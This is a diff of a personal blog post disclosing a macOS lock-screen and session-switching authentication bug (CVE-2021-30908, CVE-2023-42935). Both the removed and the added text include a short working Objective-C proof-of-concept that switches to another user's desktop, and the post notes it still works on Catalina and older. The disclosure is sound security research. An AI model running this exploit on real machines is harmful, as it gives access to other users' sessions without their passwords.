@@ -1,25 +1,30 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="initial-scale=1"><link rel="stylesheet" href="/style.css"><link rel="icon" href="/icon.png"><title>amy's website</title></head><body><div class="top"><h1><a href="/">amy's website</a></h1><p><a href="https://github.com/asentientbot" target="_blank">github</a> / <a href="https://asentientbot.ca/@a" target="_blank">fedi</a> / <a href="mailto:asentientbot@gmail.com">email</a></p></div><div><h2>SkyLight sessions bug</h2><p>In various macOS versions, <code>SLSSessionSwitchToSessionID</code> doesn't check if it was called by the login window. This lets any user switch to another logged-in user's desktop without their password. If Guest is enabled, it effectively bypasses the lock screen.</p><p>I reported this in September 2021; it was fixed in <a href="https://support.apple.com/en-ca/HT212872" target="_blank">macOS 11.6.1</a> and <a href="https://support.apple.com/en-ca/HT212869" target="_blank">macOS 12.0.1</a>:</p><pre><code>Impact: A local attacker may be able to view the previous logged in user’s desktop from the fast user switching screen
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="initial-scale=1"><link rel="stylesheet" href="/style.css"><link rel="icon" href="/icon.png"><title>amy's website</title></head><body><div class="top"><h1><a href="/">amy's website</a></h1><p><a href="https://github.com/asentientbot" target="_blank">github</a> / <a href="https://asentientbot.ca/@a" target="_blank">fedi</a> / <a href="mailto:asentientbot@gmail.com">email</a></p></div><div><h2>SkyLight sessions bug</h2><p>In various macOS versions, <code>SLSSessionSwitchToSessionID</code> doesn't check if it was called by the login window. This lets any user switch to another logged-in user's desktop without their password. If Guest is enabled, it can bypass the lock screen.</p><p>I reported this in September 2021; it was fixed in <a href="https://support.apple.com/en-ca/HT212872" target="_blank">macOS 11.6.1</a> and <a href="https://support.apple.com/en-ca/HT212869" target="_blank">macOS 12.0.1</a>:</p><pre><code>Impact: A local attacker may be able to view the previous logged in user’s desktop from the fast user switching screen
 Description: An authentication issue was addressed with improved state management.
 CVE-2021-30908: ASentientBot
-</code></pre><p>Amusingly, the bug reappeared in macOS Ventura, and it was fixed again in <a href="https://support.apple.com/en-ca/120307" target="_blank">macOS 13.6.4</a> and <a href="https://support.apple.com/en-ca/109051" target="_blank">macOS 14.1</a> as <code>CVE-2023-42935</code>.</p><p>I received an Apple Security Bounty both times.</p><p>It still works on macOS Catalina and older.</p><h3>thanks</h3><p>Thank you to <a href="https://x.com/916253" target="_blank">emma (916253)</a> and <a href="https://github.com/moosethegoose2213" target="_blank">ASentientHedgehog</a> for testing on countless versions and helping me navigate the reporting process!</p><h3>sample code</h3><p>This program will switch to another user's desktop on affected versions.</p><pre><code>// clang -fmodules -F /System/Library/PrivateFrameworks -framework SkyLight thing.m -o thing &amp;&amp; ./thing
+</code></pre><p>Amusingly, the bug reappeared in macOS Ventura, and it was fixed again in <a href="https://support.apple.com/en-ca/120307" target="_blank">macOS 13.6.4</a> and <a href="https://support.apple.com/en-ca/109051" target="_blank">macOS 14.1</a> as <code>CVE-2023-42935</code>.</p><p>I received an Apple Security Bounty both times.</p><p>It still works on macOS Catalina and older.</p><h3>thanks</h3><p>Thank you to <a href="https://x.com/916253" target="_blank">emma (916253)</a> and <a href="https://github.com/moosethegoose2213" target="_blank">ASentientHedgehog</a> for testing on countless versions and helping me navigate the reporting process!</p><h3>sample code</h3><p>This program will switch to another user's desktop on affected versions.</p><pre><code>// clang -fmodules thing.m -o thing &amp;&amp; ./thing
 
 @import Foundation;
-@import Darwin;
 
-void SLSSessionSwitchToSessionID(int);
+extern const NSString* kCGSSessionIDKey;
+extern const NSString* kCGSSessionLongUserNameKey;
+NSArray&lt;NSDictionary*&gt;* CGSCopySessionList();
+void CGSSessionSwitchToSessionID(int);
 
-int main()
+int main(int argCount,char** args)
 {
-	for(int guess=0;;guess++)
+	if(argCount!=2)
 	{
-		SLSSessionSwitchToSessionID(guess);
+		NSLog(@"usage: %s &lt;session id&gt;\n",args[0]);
 		
-		struct stat consoleInfo;
-		assert(!stat("/dev/console",&amp;consoleInfo));
-		if(consoleInfo.st_uid!=getuid())
+		for(NSDictionary* session in CGSCopySessionList())
 		{
-			break;
+			NSLog(@"%@ %@\n",session[kCGSSessionIDKey],session[kCGSSessionLongUserNameKey]);
 		}
+		
+		return 1;
 	}
+	
+	CGSSessionSwitchToSessionID(@(args[1]).intValue);
 }
+
 </code></pre></div></body></html>
